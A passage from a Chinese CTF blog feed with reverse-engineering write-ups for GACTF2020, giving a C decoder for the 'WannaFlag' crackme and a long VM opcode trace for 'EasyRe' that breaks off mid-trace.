:23946</strong>（本地可以不写ip，127.0.0.1）</li></ol><p>ida：与之前的ida的<strong>Remote linux debugger</strong>类似。<img src="/2020/09/18/iot-mips%E7%A8%8B%E5%BA%8F%E5%8A%A8%E8%B0%83-qemu%E5%AD%A6%E4%B9%A0-ghidra/image-20200919110620683.png" alt="image-20200919110620683"></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GACTF2020</title>
      <link href="/2020/08/30/GACTF2020/"/>
      <url>/2020/08/30/GACTF2020/</url>
      
        <content type="html"><![CDATA[<p>做了2个逆向及杂项还是有收获。<a id="more"></a></p><h2 id="Reverse："><a href="#Reverse：" class="headerlink" title="Reverse："></a>Reverse：</h2><h3 id="WannaFlag"><a href="#WannaFlag" class="headerlink" title="WannaFlag"></a>WannaFlag</h3><p>打开程序，炫酷的界面和音乐。其实就是一个CrackeMe。<img src="/2020/08/30/GACTF2020/image-20200913175304433.png" alt="image-20200913175304433"></p><p>载入ida，直接定位到GetwindowText或者GetDlgItemText函数。</p><p><img src="/2020/08/30/GACTF2020/image-20200913174317321.png" alt="image-20200913174317321"></p><p>关键就是那个复杂的if语句根本就执行不到，直接跳过。</p><p>对input进行了xor与ror操作。直接逆即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">78</span>, <span class="number">174</span>,  <span class="number">97</span>, <span class="number">186</span>, <span class="number">228</span>,  <span class="number">43</span>,  <span class="number">85</span>, <span class="number">170</span>,  <span class="number">89</span>, <span class="number">252</span>, </span><br><span class="line">   <span class="number">77</span>,   <span class="number">2</span>,  <span class="number">23</span>, <span class="number">107</span>,  <span class="number">19</span>, <span class="number">161</span>,  <span class="number">65</span>, <span class="number">254</span>,  <span class="number">53</span>,  <span class="number">11</span>, </span><br><span class="line">  <span class="number">180</span>,  <span class="number">11</span>,  <span class="number">82</span>,  <span class="number">47</span>,  <span class="number">70</span>, <span class="number">204</span>,  <span class="number">53</span>, <span class="number">130</span>, <span class="number">229</span>, <span class="number">136</span>, </span><br><span class="line">   <span class="number">80</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v37 = <span class="number">6</span>, v38 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> i, j, len = <span class="number">31</span>;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"ANNAWGALFYBKVIAHMXTFCAACLAAAAYK"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">2</span>; i &lt; v37; i++)</span><br><span class="line">v38 *= i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> temp = i%<span class="number">8</span>;</span><br><span class="line"><span class="keyword">int</span> ans = ((ida_[i] &gt;&gt; temp) | (ida_[i]&amp;((<span class="keyword">int</span>)<span class="built_in">pow</span>(<span class="number">2</span>, temp)<span class="number">-1</span>)) &lt;&lt; <span class="number">8</span>-temp) ^ s[i]; <span class="comment">//rol</span></span><br><span class="line"><span class="built_in">putchar</span>(ans ^ v38);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//wannaflag_is_just_a_paper_tiger</span></span><br></pre></td></tr></table></figure><p>最后将其输入程序的输入框，打开解密后的flag文件得到flag。</p><p><img src="/2020/08/30/GACTF2020/image-20200913174837508.png" alt="image-20200913174837508"></p><h3 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h3><p>ida打开后，main函数sp-analysis failed，简单修复一下栈指针就行。</p><p><img src="/2020/08/30/GACTF2020/image-20200913182620575.png" alt="image-20200913182620575"></p><p>来到main函数，首先是输入一个整型数据，从交叉引用发现对该数据后面并没有使用，猜测对函数代码有一个解密过程。发现后面有一个<strong>mprotect()</strong>函数修改指定内存保护属性，即把要解密的代码的内存改为可写。接着的函数实现解密一个函数代码功能。</p><p>动调来到解密的函数（这里我也反复修了几次，才完美的F5）：一个VM且前面已经申请了存放数据的内存空间和初始化。</p><p><img src="/2020/08/30/GACTF2020/image-20200913183634163.png" alt="image-20200913225646159"></p><p>开始是单步调试，由于分支比较多，后面将整个函数与opcode复制到C语言编译器，打印出函数根据opcode的执行情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line">a1[<span class="number">1</span>] = input</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">13</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">a1[<span class="number">1</span>] &lt;&lt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">2029229568</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">17</span></span><br><span class="line">a1[<span class="number">1</span>] &lt;&lt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">-2049703936</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = a1[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">19</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] == <span class="number">653840640</span> ) <span class="built_in">exit</span>(<span class="number">0</span>) <span class="comment">//首先根据输入的整型数据经过运算后与指定值进行比较，不正确则退出。</span></span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = input <span class="comment">//下面依次使用输入的整型数据经过运算后存放入dword_804B2A0数组。</span></span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">3</span>] = <span class="number">2</span></span><br><span class="line">a1[<span class="number">1</span>] *= a1[<span class="number">3</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">24</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">0</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = input</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">8</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">5</span>] = <span class="number">7</span></span><br><span class="line">a1[<span class="number">1</span>] /= a1[<span class="number">5</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">33</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">1</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = input</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">16</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">9</span>] = <span class="number">187</span></span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">2</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = <span class="number">10000</span></span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">24</span></span><br><span class="line">a1[<span class="number">1</span>] &gt;&gt;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">255</span></span><br><span class="line">a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">4</span>] = <span class="number">160</span></span><br><span class="line">a1[<span class="number">1</span>] -= a1[<span class="number">4</span>]</span><br><span class="line">a1[<span class="number">2</span>] = <span class="number">119</span></span><br><span class="line">a1[<span class="number">1</span>] += a1[<span class="number">2</span>]</span><br><span class="line">dword_804B2A0[<span class="number">3</span>] = a1[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"flag:"</span>) <span class="comment">//输入flag</span></span><br><span class="line">    </span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">0</span>] <span class="comment">//下面依次对输入的flag的每一位与dword_804B2A0中的数据异或，</span></span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>] </span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">267</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)  <span class="comment">//并与指定数据比较，不相等则退出。</span></span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">1</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">122</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">2</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">149</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">3</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">262</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">4</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">125</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">5</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">173</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">6</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">303</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">7</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">357</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">8</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">301</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">9</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">303</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">10</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">313</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">11</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">12</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">187</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">13</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">8</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">14</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">15</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">319</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">16</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">314</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">17</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">353</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">18</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">87</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">19</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">288</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">20</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">21</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">319</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">22</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">319</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">23</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">181</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">24</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">275</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">25</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2AC</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">160</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">26</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">289</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">27</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">269</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">28</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A4</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">11</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">29</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A8</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">313</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">30</span>]</span><br><span class="line">a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>]</span><br><span class="line">a1[<span class="number">1</span>] ^= a1[<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">371</span> ) <span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)buf[<span class="number">31</span>]</span><br><span class="line">a1[<span class="number">9</span>] = 